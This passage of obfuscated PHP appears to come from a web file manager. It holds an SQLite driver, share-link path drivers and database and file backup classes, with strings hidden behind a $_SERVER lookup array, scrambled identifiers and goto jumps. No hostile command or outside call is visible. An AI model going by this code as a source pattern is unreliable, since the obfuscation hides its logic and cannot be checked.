$_SERVER[Ù×¯Ø…]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Üøå³¤Ü; if ($this->queryID) { $this->free(); } think_action_status($É†¯Œİ[19], 1); think_status($É†¯Œİ[20]); $this->queryID = $this->_linkID->query($Üøå³¤Ü); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $³‰„®¸¢ = $this->getAll(); $this->numRows = count($³‰„®¸¢); return $³‰„®¸¢; } } public function execute($½è¶ÕÏ’) { $îúùïÓñ =& $_SERVER[Ù×¯Ø…]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $½è¶ÕÏ’; if ($this->queryID) { $this->free(); } think_action_status($îúùïÓñ[21], 1); think_status($îúùïÓñ[20]); $ùÛ¬×Œ® = $this->_linkID->exec($½è¶ÕÏ’); $this->debug(); if (!1 === $ùÛ¬×Œ®) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Ù×¯Ø…][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ä£ë÷¤Å = $this->_linkID->query($_SERVER[Ù×¯Ø…][23]); if (!$ä£ë÷¤Å) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ñ˜§Ö© = $this->_linkID->query($_SERVER[Ù×¯Ø…][24]); if (!$ñ˜§Ö©) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ŠÁã¨±Ú = array(); while ($ÖÁë‰ÚÃ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ŠÁã¨±Ú[] = $ÖÁë‰ÚÃ; } $this->queryID->reset(); return $ŠÁã¨±Ú; } public function getFields($„¿ÔÁ§«) { $·ıéığÏ =& $_SERVER[Ù×¯Ø…]; $ØêÂ¿¤Ô = $this->query($·ıéığÏ[25] . $„¿ÔÁ§« . $·ıéığÏ[26]); $¾È±ë»¸ = array(); if ($ØêÂ¿¤Ô) { foreach ($ØêÂ¿¤Ô as $»¸òñ°Ì => $îœºøÃ) { $¾È±ë»¸[$îœºøÃ[$·ıéığÏ[28]]] = array($·ıéığÏ[28] => $îœºøÃ[$·ıéığÏ[28]], $·ıéığÏ[29] => $îœºøÃ[$·ıéığÏ[29]], $·ıéığÏ[31] => (bool) ($îœºøÃ[$·ıéığÏ[31]] === $·ıéığÏ[33]), $·ıéığÏ[34] => $îœºøÃ[$·ıéığÏ[53]], $·ıéığÏ[36] => (bool) $îœºøÃ[$·ıéığÏ[54]], $·ıéığÏ[39] => (bool) $îœºøÃ[$·ıéığÏ[54]]); } } return $¾È±ë»¸; } public function getTables($Èˆ÷äÆ = '') { $Ùº‚¿–û =& $_SERVER[Ù×¯Ø…]; $ïÙöî‡ = $this->query($Ùº‚¿–û[42] . $Ùº‚¿–û[43] . $Ùº‚¿–û[44]); $Á†…Œ¸ = array(); foreach ($ïÙöî‡ as $´¿¹‚ı¿ => $´½Ô›Ô) { $Á†…Œ¸[$´¿¹‚ı¿] = current($´½Ô›Ô); } return $Á†…Œ¸; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ì†Öáãı =& $_SERVER[Ù×¯Ø…]; $this->error = $this->_linkID->lastErrorMsg(); if ($ì†Öáãı[33] != $this->queryStr) { $this->error .= LNG($ì†Öáãı[45]) . $this->queryStr; } think_trace($this->error, $ì†Öáãı[33], $ì†Öáãı[46]); return $this->error; } public function escapeString($ìÙšğç—) { $Œ¨Æ°Ş =& $_SERVER[Ù×¯Ø…]; if ($this->_linkID) { return $this->_linkID->escapeString($ìÙšğç—); } return str_ireplace($Œ¨Æ°Ş[55], $Œ¨Æ°Ş[56], $ìÙšğç—); } public function parseLimit($˜ú‡âÌï) { $•ñ”€”ô =& $_SERVER[Ù×¯Ø…]; $¤œŒş§† = $•ñ”€”ô[33]; if (!empty($˜ú‡âÌï)) { $˜ú‡âÌï = explode($•ñ”€”ô[47], $˜ú‡âÌï); if (count($˜ú‡âÌï) > 1) { $¤œŒş§† .= $•ñ”€”ô[48] . $˜ú‡âÌï[1] . $•ñ”€”ô[49] . $˜ú‡âÌï[0] . $•ñ”€”ô[50]; } else { $¤œŒş§† .= $•ñ”€”ô[48] . $˜ú‡âÌï[0] . $•ñ”€”ô[50]; } } return $¤œŒş§†; } } goto A¡äöŸŒ­¾; fŸùô…´£…: class PathDriverDbShareLink extends PathDriverDB { public function __construct($Åİ¾ àØ) { $this->pathParse = $Åİ¾ àØ; $this->model = Model($_SERVER[Ù×¯Ø…][1253]); } protected function infoParse($ ÃØØİà, $°ßœ™±¦ = false, $ìñœ‹˜œ = false) { $Ğ’‰‘Ì• =& $_SERVER[Ù×¯Ø…]; return Action($Ğ’‰‘Ì•[1105])->sharePathInfo($this->pathParse[$Ğ’‰‘Ì•[76]], !0); } public function listPath($·¨ë‘ò, $“ÇáÕ±• = false) { $³²³ßú =& $_SERVER[Ù×¯Ø…]; $ê¬È“èË = parent::listPath($·¨ë‘ò, $“ÇáÕ±•); if (!$ê¬È“èË) { return $ê¬È“èË; } if (is_array($ê¬È“èË[$³²³ßú[1262]])) { $ê¬È“èË[$³²³ßú[1262]] = Action($³²³ßú[1105])->shareItemInfo($ê¬È“èË[$³²³ßú[1262]]); } foreach ($ê¬È“èË as $“º£ˆ¤ö => $¹ˆÃãÌà) { if (!in_array($“º£ˆ¤ö, array($³²³ßú[74], $³²³ßú[75]))) { continue; } foreach ($¹ˆÃãÌà as $Î¸ş Š¼ => $Îü“”ò) { $ê¬È“èË[$“º£ˆ¤ö][$Î¸ş Š¼] = Action($³²³ßú[1105])->shareItemInfo($Îü“”ò); } } return $ê¬È“èË; } public function listAll($ö­Ş§–©) { $ïäêÔ«¥ =& $_SERVER[Ù×¯Ø…]; $Â·¤ÚÌû = IO::info($this->pathParse[$ïäêÔ«¥[76]]); if (!$Â·¤ÚÌû) { return array(); } $“åàÂé” = $this->model->listAll($ö­Ş§–©); foreach ($“åàÂé” as &$šæ«Üã§) { $šæ«Üã§[$ïäêÔ«¥[85]] = Action($ïäêÔ«¥[1105])->shareItemInfo($šæ«Üã§[$ïäêÔ«¥[85]]); } unset($šæ«Üã§); return $“åàÂé”; } } class PathDriverDriverShareItem { public function __construct($ëæÅõ‘ø) { $this->pathParse = $ëæÅõ‘ø; } public function __call($¢Ö³˜°Œ, $ÆİåêÅ) { $âŸ÷ĞØ¥ =& $_SERVER[Ù×¯Ø…]; if (method_exists($this, $¢Ö³˜°Œ)) { return; } $‡ªıªÌ = call_user_func_array(array($âŸ÷ĞØ¥[1263], $¢Ö³˜°Œ), $ÆİåêÅ); $¢ÊŞµ® = array($âŸ÷ĞØ¥[1264], $âŸ÷ĞØ¥[1265], $âŸ÷ĞØ¥[1266], $âŸ÷ĞØ¥[1267], $âŸ÷ĞØ¥[552], $âŸ÷ĞØ¥[554], $âŸ÷ĞØ¥[1268], $âŸ÷ĞØ¥[107], $âŸ÷ĞØ¥[1269], $âŸ÷ĞØ¥[1270]); if (in_array($¢Ö³˜°Œ, $¢ÊŞµ®)) { $‡ªıªÌ = $this->getPathOuter($‡ªıªÌ); } return $‡ªıªÌ; } public function copy($¡‡Éí÷, $ƒóôà’Ç, $Ì„ÑÎ = false, $ŠÍø´Ó” = false) { return $this->copyMove($¡‡Éí÷, $ƒóôà’Ç, $Ì„ÑÎ, $_SERVER[Ù×¯Ø…][552], $ŠÍø´Ó”); } public function move($”¥§é»Ü, $‰……š­‚, $“ÎÅ½ºà = false, $ôò¹üÍ« = false) { return $this->copyMove($”¥§é»Ü, $‰……š­‚, $“ÎÅ½ºà, $_SERVER[Ù×¯Ø…][554], $ôò¹üÍ«); } private function copyMove($ÄÇ˜æØ, $˜ø÷´ÔÂ, $öü–Ì, $Ö¶û­ûƒ, $óŒ¹æÀŒ = false) { $¨õş·“ˆ =& $_SERVER[Ù×¯Ø…]; $ôĞºªâİ = $˜ø÷´ÔÂ; $ƒ¬üú¸è = IO::driverMake($˜ø÷´ÔÂ); if ($ƒ¬üú¸è->pathParse[$¨õş·“ˆ[1083]]) { $˜ø÷´ÔÂ = $ƒ¬üú¸è->pathParse[$¨õş·“ˆ[1083]]; } else { $˜ø÷´ÔÂ = $ôĞºªâİ; } $‘‚®³¯Ô = IO::copyMove($ÄÇ˜æØ, $˜ø÷´ÔÂ, $öü–Ì, $Ö¶û­ûƒ, $óŒ¹æÀŒ); $‘‚®³¯Ô = $this->getPathOuter($‘‚®³¯Ô); return $‘‚®³¯Ô; } public function pathThis($æˆÚ©ùÃ) { return get_path_this($this->pathParse[$_SERVER[Ù×¯Ø…][76]]); } public function pathFather($¢Ùø‚©) { return get_path_father($this->pathParse[$_SERVER[Ù×¯Ø…][76]]); } public function iconvSystem($Öù²ø„½) { return $Öù²ø„½; } protected function infoParse($èÃÌ€Á·, $Ëê‡³ì = false) { $õƒê ù’ =& $_SERVER[Ù×¯Ø…]; $Øşèö˜ = $this->pathParse[$õƒê ù’[489]][$õƒê ù’[1106]] . $this->pathParse[$õƒê ù’[1099]]; if ($Ëê‡³ì) { $“ÕùŒá = IO::infoWithChildren($Øşèö˜); } else { $“ÕùŒá = IO::info($Øşèö˜); } $Å‚ó¹öñ = $this->pathParse[$õƒê ù’[489]]; return Action($õƒê ù’[1261])->_shareItemeParse($“ÕùŒá, $Å‚ó¹öñ); } public function listAll($›¡¬í½») { $öÁ˜™Ù¾ =& $_SERVER[Ù×¯Ø…]; $ïáµÚ›Ä = IO::listAll($›¡¬í½»); $±¶°µ¡– = $this->pathParse[$öÁ˜™Ù¾[489]]; foreach ($ïáµÚ›Ä as &$¤²¸) { check_abort(); $ÁÂÒÙÌ = IO::info($¤²¸[$öÁ˜™Ù¾[76]]); $ÁÂÒÙÌ = is_array($ÁÂÒÙÌ) ? $ÁÂÒÙÌ : array(); $¤²¸ = array_merge($ÁÂÒÙÌ, $¤²¸); $¤²¸[$öÁ˜™Ù¾[85]] = Action($öÁ˜™Ù¾[1261])->_shareItemeParse($¤²¸, $±¶°µ¡–); } unset($¤²¸); return $ïáµÚ›Ä; } public function getPathOuter($ÕãÚàò÷) { $øµı¤êå =& $_SERVER[Ù×¯Ø…]; $µÖçÍŒ­ = KodIO::parse($ÕãÚàò÷); if ($µÖçÍŒ­[$øµı¤êå[29]] == KodIO::KOD_SHARE_ITEM) { return $µÖçÍŒ­[$øµı¤êå[76]]; } $Í¬ÑÇ²£ = KodIO::clear($ÕãÚàò÷); $ó´ÈñåÚ = KodIO::clear($this->pathParse[$øµı¤êå[489]][$øµı¤êå[1106]]); $ş¶ß®˜¶ = substr($Í¬ÑÇ²£, strlen($ó´ÈñåÚ)); if (substr($Í¬ÑÇ²£, 0, strlen($ó´ÈñåÚ)) != $ó´ÈñåÚ) { return !1; } return $this->pathParse[$øµı¤êå[1100]] . $øµı¤êå[8] . ltrim($ş¶ß®˜¶, $øµı¤êå[8]); } public function getType() { $áÍÊŸ® =& $_SERVER[Ù×¯Ø…]; $™Í°Ü†ƒ = str_replace($áÍÊŸ®[72], $áÍÊŸ®[33], get_class($this)); return strtolower($™Í°Ü†ƒ); } public function isTypeObject($Á…Ïô˜¤) { return IO::isTypeObject($Á…Ïô˜¤); } public function info($–÷ãäÙÚ) { return $this->infoParse($–÷ãäÙÚ); } public function infoAuth($˜°óÚ¸») { return $this->infoParse($˜°óÚ¸»); } public function infoWithChildren($ø³ï«§„) { return $this->infoParse($ø³ï«§„, !0); } public function infoFull($ò“°Ô‚•) { return $this->infoParse($ò“°Ô‚•); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($¿İ¼±õ‹) { $this->pathParse = $¿İ¼±õ‹; } protected function infoParse($˜Ìšêî’, $¤º¦èöæ = false) { $ö–îÙÒ =& $_SERVER[Ù×¯Ø…]; return Action($ö–îÙÒ[1105])->sharePathInfo($this->pathParse[$ö–îÙÒ[76]], !0, $¤º¦èöæ); } public function listPath($—‘ë‚ƒâ, $©£ôØŠï = false) { $‡˜»ş†á =& $_SERVER[Ù×¯Ø…]; $Ñ—´Ìã„ = IO::listPath($—‘ë‚ƒâ, $©£ôØŠï); if (!$Ñ—´Ìã„) { return $Ñ—´Ìã„; } if (is_array($Ñ—´Ìã„[$‡˜»ş†á[1262]])) { $æÒÁÂá = Action($‡˜»ş†á[1271])->parsePathChildren($Ñ—´Ìã„[$‡˜»ş†á[1262]], array($‡˜»ş†á[425] => $—‘ë‚ƒâ)); $Ñ—´Ìã„[$‡˜»ş†á[1262]] = Action($‡˜»ş†á[1105])->shareItemInfo($æÒÁÂá); } foreach ($Ñ—´Ìã„ as $ıºô— => $¬Šåç‹) { if (!in_array($ıºô—, array($‡˜»ş†á[74], $‡˜»ş†á[75]))) { continue; } foreach ($¬Šåç‹ as $›§Õ‡ú· => $æÒÁÂá) { $æÒÁÂá = Action($‡˜»ş†á[1271])->parsePathChildren($æÒÁÂá, array($‡˜»ş†á[425] => $—‘ë‚ƒâ)); $Ñ—´Ìã„[$ıºô—][$›§Õ‡ú·] = Action($‡˜»ş†á[1105])->shareItemInfo($æÒÁÂá); } } return $Ñ—´Ìã„; } public function listAll($¢òôûÊ±) { $Ûéö…“ñ =& $_SERVER[Ù×¯Ø…]; $Ôà—Ê‚È = IO::listAll($¢òôûÊ±); foreach ($Ôà—Ê‚È as &$½é£Õï) { $ıœ­ñÛğ = IO::info($½é£Õï[$Ûéö…“ñ[76]]); $ıœ­ñÛğ = is_array($ıœ­ñÛğ) ? $ıœ­ñÛğ : array(); $½é£Õï = array_merge($ıœ­ñÛğ, $½é£Õï); $½é£Õï[$Ûéö…“ñ[85]] = Action($Ûéö…“ñ[1105])->shareItemInfo($½é£Õï); } unset($½é£Õï); return $Ôà—Ê‚È; } } goto Dç¸á·´Ñê; c‡ÇÉ£öåâ: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $¶ĞŞèÁ¼ =& $_SERVER[Ù×¯Ø…]; $this->isManual(); self::$name = date($¶ĞŞèÁ¼[747]); if (!($äØ¤ó€Æ = Model($¶ĞŞèÁ¼[748])->lastItem())) { $äØ¤ó€Æ = $this->initData(); } else { self::$name = $äØ¤ó€Æ[$¶ĞŞèÁ¼[28]]; if ($äØ¤ó€Æ[$¶ĞŞèÁ¼[749]] == $¶ĞŞèÁ¼[87]) { self::$name = date($¶ĞŞèÁ¼[750]); $«°şğ‡ = 0; if (isset($äØ¤ó€Æ[$¶ĞŞèÁ¼[291]][$¶ĞŞèÁ¼[193]][$¶ĞŞèÁ¼[470]])) { $«°şğ‡ = (int) $äØ¤ó€Æ[$¶ĞŞèÁ¼[291]][$¶ĞŞèÁ¼[193]][$¶ĞŞèÁ¼[470]]; } if (self::$manual == 0 && $äØ¤ó€Æ[$¶ĞŞèÁ¼[28]] == self::$name) { Model($¶ĞŞèÁ¼[748])->remove($äØ¤ó€Æ[$¶ĞŞèÁ¼[395]]); } $äØ¤ó€Æ = $this->initData($«°şğ‡, $äØ¤ó€Æ[$¶ĞŞèÁ¼[751]]); } else { $this->checkStore($äØ¤ó€Æ[$¶ĞŞèÁ¼[751]]); } } self::$option = $äØ¤ó€Æ; } private function isManual() { $“ùÕÖ„‚ = _get($GLOBALS, $_SERVER[Ù×¯Ø…][752], 0); $“ùÕÖ„‚ = intval($“ùÕÖ„‚); self::$manual = $“ùÕÖ„‚ && $“ùÕÖ„‚ == 1 ? 1 : 0; } private function initData($õ›Ã¯îô = 0, $ÁÚŒ«˜º = '') { $¡˜ßª©û =& $_SERVER[Ù×¯Ø…]; $Ú¢†Ù¯œ = Model($¡˜ßª©û[748])->config(); if ($ÁÚŒ«˜º && $Ú¢†Ù¯œ[$¡˜ßª©û[751]] != $ÁÚŒ«˜º) { $õ›Ã¯îô = 0; } $this->checkStore($Ú¢†Ù¯œ[$¡˜ßª©û[751]]); if (self::$manual == 1) { self::$name .= $¡˜ßª©û[71] . date($¡˜ßª©û[753]); } $Ô‡ŸÜµ = array($¡˜ßª©û[751] => $Ú¢†Ù¯œ[$¡˜ßª©û[751]], $¡˜ßª©û[28] => self::$name, $¡˜ßª©û[749] => 0, $¡˜ßª©û[754] => $Ú¢†Ù¯œ[$¡˜ßª©û[754]], $¡˜ßª©û[755] => self::$manual, $¡˜ßª©û[291] => array($¡˜ßª©û[756] => array($¡˜ßª©û[749] => 0), $¡˜ßª©û[757] => array($¡˜ßª©û[749] => 0, $¡˜ßª©û[758] => 0, $¡˜ßª©û[759] => 0, $¡˜ßª©û[29] => $¡˜ßª©û[33], $¡˜ßª©û[760] => 0, $¡˜ßª©û[499] => 0), $¡˜ßª©û[761] => array($¡˜ßª©û[749] => 0, $¡˜ßª©û[758] => 0, $¡˜ßª©û[759] => 0, $¡˜ßª©û[760] => 0, $¡˜ßª©û[499] => 0), $¡˜ßª©û[193] => array($¡˜ßª©û[749] => 0, $¡˜ßª©û[762] => 0, $¡˜ßª©û[763] => 0, $¡˜ßª©û[764] => 0, $¡˜ßª©û[765] => 0, $¡˜ßª©û[470] => $õ›Ã¯îô, $¡˜ßª©û[760] => 0, $¡˜ßª©û[499] => 0)), $¡˜ßª©û[760] => time(), $¡˜ßª©û[499] => 0); $ã–ãëšë = Model($¡˜ßª©û[748])->insert($Ô‡ŸÜµ); $Ô‡ŸÜµ[$¡˜ßª©û[395]] = $ã–ãëšë; return $Ô‡ŸÜµ; } private function checkStore($ğËòÊäı) { $¤—ëàâú =& $_SERVER[Ù×¯Ø…]; $‘á¿úø = Model($¤—ëàâú[766])->listData($ğËòÊäı); Model($¤—ëàâú[766])->checkConfig($‘á¿úø); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Ù×¯Ø…][748])->findByName(self::$name); } return self::$option; } public static function set($·›±·œ¼) { $î¯©šúô =& $_SERVER[Ù×¯Ø…]; $ìŞÍÙğú = self::get(); foreach ($·›±·œ¼ as $ÔÙ¡˜¼ => $™ÏªŸã¼) { $¹å÷£œ— = explode($î¯©šúô[95], $ÔÙ¡˜¼); $õöœ¨¸ = count($¹å÷£œ—); switch ($õöœ¨¸) { case 1: $ìŞÍÙğú[$¹å÷£œ—[0]] = $™ÏªŸã¼; break; case 2: $ìŞÍÙğú[$¹å÷£œ—[0]][$¹å÷£œ—[1]] = $™ÏªŸã¼; break; case 3: $ìŞÍÙğú[$¹å÷£œ—[0]][$¹å÷£œ—[1]][$¹å÷£œ—[2]] = $™ÏªŸã¼; break; } } Model($î¯©šúô[748])->update($ìŞÍÙğú[$î¯©šúô[395]], $ìŞÍÙğú); self::$option = $ìŞÍÙğú; return self::$option; } public function keep() { $à»Äêœö =& $_SERVER[Ù×¯Ø…]; $£ÛÌÛıí = self::get(); if ($£ÛÌÛıí[$à»Äêœö[291]][$à»Äêœö[756]][$à»Äêœö[749]] == $à»Äêœö[87]) { return; } $this->backupKeep($£ÛÌÛıí); self::set(array($à»Äêœö[767] => 1)); } private function backupKeep($Î¤ö£˜Ù) { $ı˜–ª =& $_SERVER[Ù×¯Ø…]; if (self::$manual == 1) { return; } $®ï÷İÃƒ = Model($ı˜–ª[748])->listData(); if (empty($®ï÷İÃƒ)) { return; } $È“£€ = 0; $¼òİìÓ× = array(); foreach ($®ï÷İÃƒ as $­ªö…œ) { if ($È“£€ >= 7) { break; } $¼òİìÓ×[] = $­ªö…œ[$ı˜–ª[28]]; $È“£€++; } for ($È“£€ = 0; $È“£€ < 12; $È“£€++) { $¼òİìÓ×[] = date($ı˜–ª[768], strtotime("\x2d{$È“£€}\40\155\157\x6e\x74\150\163")); } $¼òİìÓ× = array_unique($¼òİìÓ×); $…‚Ã‰’È = Model($ı˜–ª[769])->get($ı˜–ª[770]); foreach ($®ï÷İÃƒ as $­ªö…œ) { if (isset($­ªö…œ[$ı˜–ª[755]]) && $­ªö…œ[$ı˜–ª[755]] == $ı˜–ª[87]) { continue; } if (!empty($­ªö…œ[$ı˜–ª[28]]) && in_array($­ªö…œ[$ı˜–ª[28]], $¼òİìÓ×)) { continue; } Model($ı˜–ª[748])->remove($­ªö…œ[$ı˜–ª[395]]); $µ“ç¤Ü‰ = $this->backupPath($Î¤ö£˜Ù, $…‚Ã‰’È); IO::remove($µ“ç¤Ü‰, !1); } } private function backupPath($Ü ¹Ò±Ì, $ôš˜’‡§ = false) { $Ôî±¿ˆã =& $_SERVER[Ù×¯Ø…]; if (!$ôš˜’‡§) { $ôš˜’‡§ = Model($Ôî±¿ˆã[769])->get($Ôî±¿ˆã[770]); } $ş»õ¤ª = $Ü ¹Ò±Ì[$Ôî±¿ˆã[28]]; $şğ•ŸÎ = substr(md5($Ôî±¿ˆã[771] . $ôš˜’‡§ . $ş»õ¤ª), 0, 8); return "\x7b\151\x6f\72{$Ü ¹Ò±Ì[$Ôî±¿ˆã[751]]}\x7d\57\x64\x61\x74\x61\142\141\x73\x65\x2f\x62\x61\x63\153\165\160\x2f" . $ş»õ¤ª . $Ôî±¿ˆã[71] . $şğ•ŸÎ; } public function db() { $ßûªÈÍ =& $_SERVER[Ù×¯Ø…]; $»”Ÿ´½ƒ = self::get(); if ($»”Ÿ´½ƒ[$ßûªÈÍ[291]][$ßûªÈÍ[757]][$ßûªÈÍ[749]] == $ßûªÈÍ[87]) { return !0; } $©ÙÜÛº† = new BackupDb(); if (!$©ÙÜÛº†->index()) { return !1; } self::set(array($ßûªÈÍ[772] => 1)); return !0; } public function dbFile() { $ıË¯ï‘ù =& $_SERVER[Ù×¯Ø…]; $â¨«ßÏ = self::get(); if ($â¨«ßÏ[$ıË¯ï‘ù[291]][$ıË¯ï‘ù[761]][$ıË¯ï‘ù[749]] == $ıË¯ï‘ù[87]) { return !0; } $—‹ë´æ­ = new BackupDbFile(); if (!$—‹ë´æ­->index()) { return !1; } self::set(array($ıË¯ï‘ù[773] => 1)); return !0; } public function file() { $ô±Ş­Ò€ =& $_SERVER[Ù×¯Ø…]; $˜âôÉÊŞ = self::get(); if ($˜âôÉÊŞ[$ô±Ş­Ò€[291]][$ô±Ş­Ò€[193]][$ô±Ş­Ò€[749]] == $ô±Ş­Ò€[87]) { return !0; } if (!isset($˜âôÉÊŞ[$ô±Ş­Ò€[754]]) || $˜âôÉÊŞ[$ô±Ş­Ò€[754]] == $ô±Ş­Ò€[191]) { $ìªßÙí“ = new BackupFile(); if (!$ìªßÙí“->index()) { return !1; } } self::set(array($ô±Ş­Ò€[774] => 1, $ô±Ş­Ò€[749] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $³¶ì“½ò =& $_SERVER[Ù×¯Ø…]; $†âì“¦¼ = Backup::get(); self::$io = $†âì“¦¼[$³¶ì“½ò[751]]; self::$name = $†âì“¦¼[$³¶ì“½ò[28]]; $÷íûâ‡® = $GLOBALS[$³¶ì“½ò[6]][$³¶ì“½ò[17]]; $«Ñ±ÖÛĞ = $this->_dbType($÷íûâ‡®); $„…“È = new DbManage($÷íûâ‡®, $«Ñ±ÖÛĞ); $ŞÕĞşÁş = array($³¶ì“½ò[775] => $«Ñ±ÖÛĞ, $³¶ì“½ò[776] => time()); Backup::set($ŞÕĞşÁş); $Ã¼™‘ˆÌ = $this->tmpFilesPath() . $³¶ì“½ò[777] . self::$name . $³¶ì“½ò[8]; del_dir($Ã¼™‘ˆÌ); mk_dir($Ã¼™‘ˆÌ); $ùôŒø• = $õ¹‹˜‚Ÿ = 0; try { $õ¾ÖáÙá = $„…“È->db()->getTables(); } catch (Exception $á€Æµæã) { return !1; } $õ¾ÖáÙá = array_diff($õ¾ÖáÙá, array($³¶ì“½ò[778], $³¶ì“½ò[779])); foreach ($õ¾ÖáÙá as $ÑûÄ Ì) { $ùôŒø• += $„…“È->model($ÑûÄ Ì)->count(); } $áÂÜ¤¦¡ = new Task($³¶ì“½ò[780], $³¶ì“½ò[781], $ùôŒø•, LNG($³¶ì“½ò[782]) . $³¶ì“½ò[783] . LNG($³¶ì“½ò[784])); foreach ($õ¾ÖáÙá as $ÑûÄ Ì) { $ÑøŒîØà = $Ã¼™‘ˆÌ . $ÑûÄ Ì . $³¶ì“½ò[785]; $…•˜ÓŞ£ = null; if ($ÑûÄ Ì == $³¶ì“½ò[786] && (!isset($†âì“¦¼[$³¶ì“½ò[754]]) || $†âì“¦¼[$³¶ì“½ò[754]] == $³¶ì“½ò[191])) { $…•˜ÓŞ£ = self::$io; } $õ¹‹˜‚Ÿ += $„…“È->sqlFromDb($ÑûÄ Ì, $ÑøŒîØà, $áÂÜ¤¦¡, $…•˜ÓŞ£); } if (isset($áÂÜ¤¦¡->task[$³¶ì“½ò[787]])) { $°û÷Êçó = $áÂÜ¤¦¡->task[$³¶ì“½ò[787]] ? $áÂÜ¤¦¡->task[$³¶ì“½ò[787]] : timeFloat(); $’‚ïµØ¯ = $°û÷Êçó - $áÂÜ¤¦¡->task[$³¶ì“½ò[788]]; if ($’‚ïµØ¯ >= 0.2) { $ùôŒø• += 1; } } $áÂÜ¤¦¡->end(); $ŞÕĞşÁş = array($³¶ì“½ò[775] => $«Ñ±ÖÛĞ, $³¶ì“½ò[772] => 1, $³¶ì“½ò[789] => $ùôŒø•, $³¶ì“½ò[790] => $õ¹‹˜‚Ÿ, $³¶ì“½ò[791] => time()); Backup::set($ŞÕĞşÁş); if ($ùôŒø• - $õ¹‹˜‚Ÿ > 1) { $óıÉÛò£ = $³¶ì“½ò[792]; if (stristr(I18n::getType(), $³¶ì“½ò[793])) { $óıÉÛò£ = $³¶ì“½ò[794]; } write_log(array($óıÉÛò£, $ŞÕĞşÁş), $³¶ì“½ò[781]); return !1; } return !0; } private function _dbType($Åø‹ıŸú) { $ëˆ¶µ =& $_SERVER[Ù×¯Ø…]; $Åø‹ıŸú = array_change_key_case($Åø‹ıŸú); $¢®’ç‘ = $Åø‹ıŸú[$ëˆ¶µ[795]]; if ($¢®’ç‘ == $ëˆ¶µ[796]) { $ÎÆˆÀŞÊ = explode($ëˆ¶µ[4], $Åø‹ıŸú[$ëˆ¶µ[797]]); $¢®’ç‘ = $ÎÆˆÀŞÊ[0]; } $œ”®ÇÛë = array($ëˆ¶µ[798] => $ëˆ¶µ[9], $ëˆ¶µ[799] => $ëˆ¶µ[800]); if (isset($œ”®ÇÛë[$¢®’ç‘])) { $¢®’ç‘ = $œ”®ÇÛë[$¢®’ç‘]; } return $¢®’ç‘; } private function tmpFilesPath() { $åÈ€ä»¸ =& $_SERVER[Ù×¯Ø…]; $ø–ñ¥éÁ = TEMP_FILES; if ($GLOBALS[$åÈ€ä»¸[6]][$åÈ€ä»¸[88]][$åÈ€ä»¸[801]]) { $ø–ñ¥éÁ = $GLOBALS[$åÈ€ä»¸[6]][$åÈ€ä»¸[88]][$åÈ€ä»¸[801]]; if (!mk_dir($ø–ñ¥éÁ) || !is_writable($ø–ñ¥éÁ) || !IO::mkfile($ø–ñ¥éÁ . $åÈ€ä»¸[802])) { $ø–ñ¥éÁ = TEMP_FILES; } } return $ø–ñ¥éÁ; } } class BackupDbFile { public function __construct() { } public function index() { $¢¼ó¼° =& $_SERVER[Ù×¯Ø…]; $¯øÙ¾¹€ = Backup::get(); $èŒŠïúî = $¯øÙ¾¹€[$¢¼ó¼°[28]]; $ÛéŞ°´— = $this->tmpFilesPath() . "\142\x61\x63\153\x75\x70\137{$èŒŠïúî}\57"; $öÁ¿İˆ¶ = $this->backupPath($¯øÙ¾¹€); if (!($öÁ¿İˆ¶ = IO::mkdir($öÁ¿İˆ¶))) { return !1; } $Ï°«Ë¼ = IO::listPath($ÛéŞ°´—); $şÇÜ¸¤Ö = isset($Ï°«Ë¼[$¢¼ó¼°[74]]) ? $Ï°«Ë¼[$¢¼ó¼°[74]] : array(); $»Å¯Â•ê = array_sum(array_column($şÇÜ¸¤Ö, $¢¼ó¼°[78])); if (!$»Å¯Â•ê) { return !1; } $¬Œ–ü = array($¢¼ó¼°[803] => $»Å¯Â•ê, $¢¼ó¼°[804] => time()); Backup::set($¬Œ–ü); $®ö¥×ñ§ = new TaskFileTransfer($¢¼ó¼°[805], $¢¼ó¼°[781], count($şÇÜ¸¤Ö), LNG($¢¼ó¼°[782]) . $¢¼ó¼°[463] . LNG($¢¼ó¼°[784]) . $¢¼ó¼°[806]); $®ö¥×ñ§->task[$¢¼ó¼°[762]] = $»Å¯Â•ê; foreach ($Ï°«Ë¼[$¢¼ó¼°[74]] as $ßÖ±æôİ) { $Åë£‘ÖÕ = IO::move($ßÖ±æôİ[$¢¼ó¼°[76]], $öÁ¿İˆ¶); if (!$Åë£‘ÖÕ) { $®ö¥×ñ§->end(); $±’­ñü– = IO::getLastError($¢¼ó¼°[807] . $ßÖ±æôİ[$¢¼ó¼°[76]] . $¢¼ó¼°[808] . $öÁ¿İˆ¶ . $¢¼ó¼°[539]); write_log($±’­ñü–, $¢¼ó¼°[781]); return !1; } } $´àì³›û = CONTROLLER_DIR . $¢¼ó¼°[809]; $ıé¶¯¶í = CONTROLLER_DIR . $¢¼ó¼°[810]; IO::copy($´àì³›û, $öÁ¿İˆ¶); IO::copy($ıé¶¯¶í, $öÁ¿İˆ¶); $®ö¥×ñ§->end(); $¬Œ–ü = array($¢¼ó¼°[811] => $»Å¯Â•ê, $¢¼ó¼°[812] => time()); Backup::set($¬Œ–ü); return !0; } private function backupPath($˜¶æ«ï) { $ùŠ ³îà =& $_SERVER[Ù×¯Ø…]; $ÅÌµ¢Æ = $˜¶æ«ï[$ùŠ ³îà[28]]; $§ã„±Ê” = Model($ùŠ ³îà[769])->get($ùŠ ³îà[770]); $åìÇÔã§ = 